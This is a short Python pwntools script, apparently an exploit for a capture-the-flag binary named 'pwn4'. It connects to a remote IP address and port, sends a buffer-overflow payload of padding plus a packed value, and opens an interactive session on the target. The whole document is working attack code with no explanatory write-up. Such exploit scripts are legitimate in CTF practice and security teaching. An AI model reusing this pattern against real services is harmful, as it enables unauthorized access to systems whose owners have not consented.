from pwn import *
context.log_level = 'debug'

#cn = process('pwn4')
cn = remote('128.199.220.74', 10003)
pwn4 = ELF('pwn4')
print cn.recvuntil('continue\n')
cn.sendline()
print cn.recvuntil('name:\n')
pay = 'a'*10+'\x00'*86+p32(0x1d2)
cn.sendline(pay)
print cn.recv()
cn.interactive()
